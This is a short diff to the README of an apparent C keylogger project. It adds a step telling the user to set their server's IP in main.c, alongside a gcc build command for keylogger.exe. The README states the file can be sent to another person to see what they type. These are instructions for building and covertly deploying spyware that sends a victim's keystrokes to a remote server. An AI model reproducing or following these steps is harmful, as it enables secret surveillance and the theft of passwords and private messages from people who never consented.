@@ -12,6 +12,7 @@ If you are more interested, then check code to learn more about it.
 It is written in C so you must have ```gcc``` compiler installed.
 
 ### Client app
+Change IP in ```main.c``` file (line 9) to your server's IP.
 Compilation: ```gcc main.c keys.c socket.c -lws2_32 -o keylogger.exe```\
 As a result, it creates exe file ```keylogger.exe``` and this is file you can send to other person to see what he/she is typing.
 
